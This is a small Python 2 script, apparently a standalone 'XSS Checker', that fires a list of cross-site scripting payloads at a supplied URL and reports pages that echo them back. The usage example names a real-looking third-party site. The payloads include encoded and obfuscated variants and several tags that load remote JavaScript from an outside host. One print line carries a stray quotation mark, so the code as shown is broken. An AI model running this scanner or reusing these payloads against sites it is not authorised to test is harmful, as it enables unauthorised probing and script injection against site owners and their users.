import sys,os,re,urllib,urllib2,socket,string

if len(sys.argv)<2:
	print "\n beenudel1986[at]gmail[dot]com"
	print "\n\tXSS Checker"
	print "\n Usage: xsschecker.py <site>"
	print "\n Example: xsschecker.py http://www.poste.dz/ap/?page=" "
	sys.exit(0)

site=sys.argv[1]
payload = [	"<script>alert('xss')</script>",
	"<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>",
	"<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>",
	"<IMG SRC=javascript:alert('XSS')>",
	"<IMG SRC=JaVaScRiPt:alert('XSS')>",
	"<IMG SRC=javascript:alert(&quot;XSS&quot;)>",
	"<IMG SRC=`javascript:alert( 'XSS')`>",
	"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
	"<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
	"<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
	"<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
	"<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
	"<<SCRIPT>alert('XSS');//<</SCRIPT>",
	"<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>",
	"<SCRIPT SRC=//ha.ckers.org/.j>",
	"<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>",
	"</TITLE><SCRIPT>alert('XSS');</SCRIPT>",	
	"<BODY ONLOAD=alert('XSS')>"]

reply=["xss","XSS","Xss"]
j=len(payload)
print "[+]Invarients Loaded",j
for payloads in payload:
	try: 
		attack= urllib2.urlopen(site+payloads, "80").readlines()
		for line in attack:
			if re.search("XSS",line.upper()):
				print "Vulnerablity Found at: ",site+payloads
				break
			
	except(urllib2.URLError, socket.timeout, socket.gaierror, socket.error): 
		pass 
	except(KeyboardInterrupt): 
		pass	